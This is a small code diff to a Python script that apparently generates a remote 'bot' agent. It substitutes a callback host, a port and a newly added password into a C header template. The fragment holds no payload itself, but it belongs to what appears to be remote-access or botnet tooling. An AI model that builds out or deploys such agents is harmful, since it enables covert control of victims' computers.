@@ -6,20 +6,20 @@ Generate Agent
 import os
 import subprocess
 
-def create_agent(lhost, lport, mode):
+def create_agent(lhost, lport, passwd, mode):
 	
 	if(len(lhost) > 0 and len(lport) > 0 and len(mode) > 0):
 		if(mode == "static"):
 			static = True
 		else:
-			print("[WARNING]: It is recommended you create a static Bot.")
 			static = False
 
 		os.chdir("bot")
 		with open("clientc.h", "r+") as source_code:
 			source = source_code.read()
 			replace = source.replace("lhost", lhost)
-			final_replace = replace.replace("lport", lport)
+			freplace = replace.replace("lport", lport)
+			final_replace = freplace.replace("passwd", passwd)
 			with open("client.h", "w") as final:
 				final.write(final_replace)
 				
